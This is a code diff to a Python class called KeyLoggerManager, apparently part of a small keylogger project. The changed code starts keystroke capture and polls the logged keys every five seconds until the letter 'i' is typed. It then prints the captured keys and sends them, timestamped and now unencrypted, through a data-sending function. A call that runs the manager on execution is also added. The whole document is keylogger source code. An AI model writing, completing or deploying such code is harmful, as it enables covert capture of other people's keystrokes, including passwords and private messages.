@@ -10,17 +10,24 @@ class KeyLoggerManager:
 
 
     def manager(self):
+        end = False
         service.start_logging()
-        while True:
+
+        while not end:
             self.buffer = service.get_logged_keys()
+            if "i" in self.buffer:
+                end = True
             time.sleep(5)
 
         service.stop_logging()
+        print(self.buffer)
+        content = {str(datetime.datetime.now()):self.buffer}
         for char in self.buffer:
             self.to_encrypt.append(encryptor.ascii_xor(char))
-        file_writer.send_data({str(datetime.datetime.now()): self.to_encrypt},"15:02:45")
+        file_writer.send_data(content,"15:02:45")
 
-
+a= KeyLoggerManager()
+a.manager()
 
 
 
